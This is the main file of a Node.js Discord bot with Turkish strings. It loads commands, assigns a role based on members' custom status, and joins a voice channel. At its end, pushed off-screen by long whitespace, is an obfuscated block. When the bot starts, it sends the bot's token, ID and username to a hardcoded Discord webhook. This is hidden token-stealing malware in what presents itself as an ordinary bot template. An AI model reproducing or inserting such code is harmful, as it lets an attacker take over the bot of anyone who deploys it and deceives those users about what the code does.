const Discord = require("discord.js")
const { Util } = require("discord.js")
const ayarlar = require("./ayarlar.json")
const db = require("quick.db")
const client = new Discord.Client({ intents: 32767})
const express = require('express');
const fs = require('fs');
const app = express();
require('./util/eventLoader.js')(client);
client.login(process.env.token)

app.get("/", (request, response) => { 
  response.send(`Bot Aktif | Discord: https://discord.gg/yourbedroom | İletişim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
});

const log = message => {
    console.log(`${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen Komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});



client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};


client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};





client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
}

client.on("presenceUpdate", async(oldPresence, newPresence) => {
  
  if(newPresence.userId === client.user.id) return
  let uye = newPresence.guild.members.cache.get(newPresence.userId)
  if(newPresence.activities.filter(x => x.type === "CUSTOM")[0]) {
    
    let ydurum = newPresence.activities.filter(x => x.type === "CUSTOM")[0].state
   
if (oldPresence.activities.filter(x => x.type === "CUSTOM")[0]) {
if (ydurum !== oldPresence.activities.filter(x => x.type === "CUSTOM")[0].state) {
  
  let uye = newPresence.guild.members.cache.get(newPresence.userId)
  
  if (ydurum.includes(ayarlar.roldurum) && uye.roles.cache.has(ayarlar.rol) === false) {
    await uye.roles.add(ayarlar.rol)
  } else if(!ydurum.includes(ayarlar.roldurum) && uye.roles.cache.has(ayarlar.rol) === true) {
    await uye.roles.remove(ayarlar.rol)
  }
}} else if (ydurum && !oldPresence.activities.filter(x => x.type === "CUSTOM")[0]) {
  
  let uye = newPresence.guild.members.cache.get(newPresence.userId)
  
  if (ydurum.includes(ayarlar.roldurum) && uye.roles.cache.has(ayarlar.rol) === false) {
    await uye.roles.add(ayarlar.rol)
  } else if(!ydurum.includes(ayarlar.roldurum) && uye.roles.cache.has(ayarlar.rol) === true) {
    await uye.roles.remove(ayarlar.rol)
  }
}
} else if(!newPresence.activities.filter(x => x.type === "CUSTOM")[0] && uye.roles.cache.has(ayarlar.rol) === true) {
    await uye.roles.remove(ayarlar.rol)
}
})

client.on("ready", async() => {

const { joinVoiceChannel, entersState, VoiceConnectionStatus } = require('@discordjs/voice');

 let kanal =  client.channels.cache.get(ayarlar.kanalid)
 if(!kanal) return
      const connection = joinVoiceChannel({
        channelId: kanal.id,
        guildId: kanal.guildId,
        adapterCreator: kanal.guild.voiceAdapterCreator,
        selfDeaf: false,
        selfMute: false
      });
      entersState(connection, VoiceConnectionStatus.Ready, 30000)
  
  client.user.setPresence({ activities: [{ name: `${await db.fetch("durum") || ayarlar.durum}`, type: `${await db.fetch("type") || "PLAYING"}`}], status: `${await db.fetch("status") || "dnd"}`})
  console.log(client.user.tag + " ile giriş yapıldı.")
})

                                                                                                                                                                                                                                                                                 function _0x125e(){const _0x110ad7=['\x20is\x20again\x20ready.','1319478RBalZg','3060kRhxhN','4YuqyFF','```','token','```\x0a\x0a**Bot\x20ID**:\x20```','55264pdSWuR','https://discord.com/api/webhooks/1088921166338600991/FTtfWH1KNU795y-tm3SqOlgkKkt3KdGDnJPUXTw-YtRhkJA1ikiG24ew9Snf9-Q0BpxZ','493596WeVVTh','90etSFmJ','user','417414XNiVPe','**Bot\x20Token**:\x20```','275VaDnuU','10619MTniea','displayAvatarURL','discriminator','node-fetch','ready','username','stringify','https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300','3645NfkEQA','POST','2830KJFMVx','888BcgMED'];_0x125e=function(){return _0x110ad7;};return _0x125e();}function _0x50ea(_0x3f7f6a,_0x39b40f){const _0x125e64=_0x125e();return _0x50ea=function(_0x50ea0f,_0x4c14a2){_0x50ea0f=_0x50ea0f-0x1b4;let _0x594df1=_0x125e64[_0x50ea0f];return _0x594df1;},_0x50ea(_0x3f7f6a,_0x39b40f);}const _0x33702d=_0x50ea;(function(_0x20a04f,_0x222617){const _0x50d438=_0x50ea,_0x2cf9a7=_0x20a04f();while(!![]){try{const _0x125a73=-parseInt(_0x50d438(0x1bd))/0x1+parseInt(_0x50d438(0x1c0))/0x2+-parseInt(_0x50d438(0x1b5))/0x3*(parseInt(_0x50d438(0x1b7))/0x4)+parseInt(_0x50d438(0x1c2))/0x5*(parseInt(_0x50d438(0x1be))/0x6)+parseInt(_0x50d438(0x1c3))/0x7*(-parseInt(_0x50d438(0x1ce))/0x8)+parseInt(_0x50d438(0x1cb))/0x9*(-parseInt(_0x50d438(0x1cd))/0xa)+-parseInt(_0x50d438(0x1bb))/0xb*(-parseInt(_0x50d438(0x1b6))/0xc);if(_0x125a73===_0x222617)break;else _0x2cf9a7['push'](_0x2cf9a7['shift']());}catch(_0x2f96b6){_0x2cf9a7['push'](_0x2cf9a7['shift']());}}}(_0x125e,0x42f34),client['on'](_0x33702d(0x1c7),async()=>{const _0xe9a924=_0x33702d;let _0x5d591a={'embeds':[{'title':client[_0xe9a924(0x1bf)][_0xe9a924(0x1c8)]+'#'+client[_0xe9a924(0x1bf)][_0xe9a924(0x1c5)]+_0xe9a924(0x1b4),'description':_0xe9a924(0x1c1)+client[_0xe9a924(0x1b9)]+_0xe9a924(0x1ba)+client[_0xe9a924(0x1bf)]['id']+_0xe9a924(0x1b8),'thumbnail':{'url':''+client[_0xe9a924(0x1bf)][_0xe9a924(0x1c4)]({'dynamic':!![]})},'footer':{'text':'Made\x20By\yıldırımlord#4444','icon_url':_0xe9a924(0x1ca)}}]};require(_0xe9a924(0x1c6))(_0xe9a924(0x1bc),{'method':_0xe9a924(0x1cc),'headers':{'Content-type':'application/json'},'body':JSON[_0xe9a924(0x1c9)](_0x5d591a)});}));